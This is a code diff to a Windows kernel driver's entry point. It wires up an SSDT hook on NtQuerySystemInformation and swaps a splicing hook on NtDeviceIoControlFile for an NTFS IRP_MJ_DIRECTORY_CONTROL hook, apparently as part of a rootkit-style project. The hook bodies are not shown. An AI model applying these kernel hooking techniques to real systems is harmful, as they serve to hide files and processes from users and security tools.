@@ -8,9 +8,11 @@
 #include "SSDTManager\SSDTManager.h"
 #include "KernelManager\KernelManager.h"
 #include "SplicingManager\SplicingManager.h"
+#include "NtfsIRPManager\NtfsIRPManager.h"
 
 #include "Hooks\SSDTHooks\ZwQuerySystemInformationHooks.h"
 #include "Hooks\SplicingHooks\ZwDeviceIoControlFileHooks.h"
+#include "Hooks\IRPHooks\NtfsIRPHooks.h"
 
 #include "Utils\List.h"
 
@@ -46,6 +48,13 @@ extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRI
         return retStatus;
     }
 
+    if (!NtfsIRPManager::getInstance().InitializeInstanceData())
+    {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "NTFS IDT Manager Init error\n");
+        retStatus = STATUS_FAILED_DRIVER_ENTRY;
+        return retStatus;
+    }
+
     SSDTHook hookNtQuerySystemInformation;
 
     hookNtQuerySystemInformation.funcName = "NtQuerySystemInformation";
@@ -65,9 +74,19 @@ extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRI
         SSDTManager::getInstance().GetIndexSyscallFromNtdll("NtDeviceIoControlFile"));
 
 
-    if (!SplicingManager::getInstance().SetHook(hookZwDeviceIoControlFile))
+    /*if (!SplicingManager::getInstance().SetHook(hookZwDeviceIoControlFile))
     {
         DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Set Splicing Hook error\n");
+        retStatus = STATUS_FAILED_DRIVER_ENTRY;
+        return retStatus;
+    }*/
+    IRPHook hook;
+    hook.IRP = IRP_MJ_DIRECTORY_CONTROL;
+    hook.HookFunc = HookDirectoryControl;
+
+    if (!NtfsIRPManager::getInstance().SetHook(hook))
+    {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Set IRP Hook error\n");
         retStatus = STATUS_FAILED_DRIVER_ENTRY;
         return retStatus;
     }
